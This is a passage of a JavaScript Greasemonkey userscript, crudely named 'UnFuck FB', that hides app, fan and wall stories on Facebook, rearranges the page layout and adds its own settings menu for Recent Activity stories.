  if (GM_config.get('recentHide')) {
    if ($('edit_profilepicture'))
      removeActivity($('content'), true);
    else if(forced) {
      var user = unsafeWindow.Env.user;
      xhr('http://www.facebook.com/ajax/stream/profile.php?__a=1&filter=1&max_time=0&try_scroll_load=true&profile_id='+user+'&viewer_id='+user, 
          function(text) {
            removeActivity(createDoc(JSON.parse(text.split('for (;;);')[1]).payload.stream_html), false);
        });
    } 
  }
}

function unfuckFeed(stream) {
  // Now may I introduce some really complicated god-like XPath that locates app and fan stories so that we can remove them
  // Wall stories = eavesdropping. Why would I care what people say to eachother?
  var fanHide = GM_config.get('fanHide') && !$xb('//a[contains(@class, "profile_action") and contains(@ajaxify, "fbpage_id")]');
  seekAndDestroy((GM_config.get('appHide') ? './/span[@class="UIIntentionalStory_BottomAttribution"]/a[starts-with(@href, "apps.facebook.com")]/ancestor::*[contains(concat(" ", @class, " "), " uiUnifiedStory ")]' : '') + (GM_config.get('appHide') && fanHide ? ' | ' : '') + (fanHide ? './/a[@class="actorName" and starts-with(@data-hovercard, "/ajax/hovercard/page.php?id=")]/ancestor::*[contains(concat(" ", @class, " "), " uiUnifiedStory")]' : '') + (GM_config.get('wallStory') && (GM_config.get('appHide') || fanHide) ? ' | ' : '' ) + (GM_config.get('wallStory') ? './/span[@class="actorName"]/a[@class="actorName" and position()=2]/child::text()[not(.="'+$('navAccountName').textContent+'")]/ancestor::li[contains(concat(" ", @class, " "), " uiUnifiedStory ")]' : ''), stream);

  return $x('count(.//*[contains(concat(" ", @class, " "), " uiUnifiedStory ")])', $('content'), 1);
}

function unfuckFB() {
  var numberOfStories = 0;

  // Unfuck the feeds
  if (!numberOfStories || numberOfStories < $x('count(.//*[contains(concat(" ", @class, " "), " uiUnifiedStory ")])', $('content'), 1))
    forEach($x('.//div[contains(@class, "UIStream")]', $('content')), 
            function(stream) { 
              if (GM_config.get('appHide') || GM_config.get('wallStory')) numberOfStories = unfuckFeed(stream);
            });

  // You can access Recent Story options from the "Options" link at the top of your feed and then click "Settings" when that link appears
  if (!$('recent_activity_header') && $('profile_settings_bar_loading') && $('profile_settings_bar_loading').className == "invisible_elem") {
    var settings = GM_config.read('recentSettings');
    var icons = {'3':'relationship', '9':'edit_profile', '10':'event', '12':'group', '15':'note', '20':'wall_post', '21':'friend', '27':'fbpage_add', '32':'post', '43':'video', '46':'photo', '69':'like', '72':'post', '107':'wall_post'};
    var labels = {'20':'Write on a Wall', '107':'Comment on a Status', '46':'Comment on a Photo', '43':'Comment on a Video', '15':'Comment on a Note', '32':'Comment on a Link', '69':'Like a Story', '10':'Attend an Event', '12':'Join a Group', '3':'Change your Relationship Status', '9':'Edit your Profile',  '21':'Add a friend', '27':'Become a Fan',  '72':'Post a Link on a Wall'};

    $('profile_settings').insertBefore(create('div', {className:'header', id:'recent_activity_header'}, create('h3', {className:'clearfix'}, create('span',{textContent:'Recent Activity Stories'}), create('div', {className:'divider', innerHTML:'&nbsp;'}))), $c('header first_header', $('profile_settings'))[0]);
      insertAfter(create('div', {className:'minor_section', id:'recent_activity_settings'}, create('span', {className:'clearfix left', textContent:'Recent Activity will appear on your Wall when you...', style:'margin-bottom: 10px; width:100%'}), create('div', {style:'width:50%', id:'recent_activity_explain'})), $('recent_activity_header'));
    forEach(labels, function(label, i) {
    $('recent_activity_explain').appendChild(create('div', {style:'padding:5px;'}, create('i', {className:'UIImageBlock_Image UIImageBlock_ICON_Image img spritemap_icons sx_icons_'+icons[i], style:'margin-right:10px;margin-left:0px;padding:0px;'}), create('input',{type:'checkbox', checked:typeof settings[i]=="boolean"?settings[i]:!GM_config.get('recentHide'), id:'recent_activity_field_'+i, style:'margin-right:5px;', onclick:function(){changeRecent(this.id.split('recent_activity_field_')[1], this.checked)}}), create(label)));
    });
  } else if ($('recent_activity_header') && !$('profile_settings')) {
    destroy($('recent_activity_header'));
    destroy($('recent_activity_settings'));
  }

  if (!$('unfucked')) {
    var left, pokes, events, requests, chat, nf, divider, pymk;
    if(left=$('leftCol')) {
      if ((chat=$('pagelet_chat_home')) && !GM_config.get('chatSide')) destroy(chat);

      // Block applications for good
      if (GM_config.get('appBlock'))
        forEach($x('//span[@class="uiStreamSource"]//a[contains(@href, "apps.facebook.com")]'),
                function(link) {
                  fbAjax("http://www.facebook.com/ajax/feed/filter_action.php?__a=1", 
                         "action=unfollow&filter_key=0&value=" + link.href.split("id=")[1] +
                         "&nctr[_mod]=pagelet_intentional_stream");
         });

      if (GM_config.get('columns') == "Two") {
        if (requests=$c('UIRequestBox')[0])
          left.appendChild(requests.parentNode.parentNode);
        if(events=$c('UIUpcoming')[0]) left.appendChild(events.parentNode.parentNode);
        if(pokes=$c('pokes')[0]) left.appendChild(pokes);
      }

      var navAccount = $('navAccount');
      if (navAccount && GM_config.get('columns') == "One") {
        var ul = navAccount.getElementsByTagName('ul')[0];
        var contentCol = $('contentCol');
        forEach($x('//div[@id="leftCol"]//ul[contains(@class, "uiSideNav")][position()<3]/li'), function(li) {
            ul.appendChild(li);
          });
        forEach($x('//div[@id="rightCol"]/*'), function(el) {
            contentCol.insertBefore(el, contentCol.firstChild);
          });
      }
      
      // Swap the apps and games filters for the notes and links
      if (divider=$x1('//ul[contains(@class, "uiSideNav")]/li[@class="divider"]')) {
        var notes = $('navItem_2347471856'),
            links = $('navItem_app_2309869772'),
            apps = $('navItem_apps'),
            games = $('navItem_games');
        removeClass(notes, 'hidden');
        removeClass(links, 'hidden');
        addClass(apps, 'hidden');
        addClass(games, 'hidden');
        divider.parentNode.insertBefore(notes, divider);
        divider.parentNode.insertBefore(links, divider);
        insertAfter(apps, divider);
        insertAfter(games, divider);
      }
        
      if (GM_config.get('showStat')) getStatus();
    }

    recentActivityProcess();
    ($('contentArea')||$('content')).appendChild(create('div', {id:'unfucked',style:'display:none;'}));
  }
}

// Re-run my code when the page changes, wouldn't have to do this if I could use CSS
function process() {
  var content;
  (content=($('contentArea')||$('content'))).removeEventListener('DOMNodeInserted', process, false);
  setTimeout(unfuckFB, 0);
  content.addEventListener('DOMNodeInserted', process, false);
}

// Wait for Facebook's content element to exist
if (self.location == top.location)
    var checker=setInterval(function(){
        if ($('content')) {
          clearInterval(checker);
          GM_addStyle(unfuckStyle);
          
          // Add access to the Settings Menu from the Navigation bar
          var navAccount = $('navAccount');
          if (navAccount) {
            var ul = $('navAccount').getElementsByTagName('ul')[0];
            ul.insertBefore(create('li', {}, create('a', {href:'#', textContent:'UnFuck FB Settings', onclick:function(e){GM_config.open();e.preventDefault()}})), ul.lastChild);
          }

          // Browser compatiblity
          if(GM_config.isGM)
            GM_registerMenuCommand("UnFuck FB Options", function() {GM_config.open()});
          else
            unsafeWindow = window;

          // Bunch of stuff for Activity Removal
          recentActivityProcess(true);
          window.activityLastChecked = new Date().getTime();
          window.mouseClicks = 0;
          window.addEventListener('unload', function() { recentActivityProcess(true) }, false);
          window.addEventListener('focus', function() {
              if (new Date().getTime() > (window.activityLastChecked+(1000*60*5))) {
                recentActivityProcess(true);
                window.activityLastChecked = new Date().getTime();
              }
            }, false);
          document.addEventListener('click', function() {
              if (window.mouseClicks >= 10) {
                recentActivityProcess(true);
                window.mouseClicks = 0;
              } else
                ++window.mouseClicks;
            }, true); 

          process(); // Start the listener
        }
      }, 200);
/*
  unfuck.exe Version 1.0 
  c.1999 SHIT Industries 
*/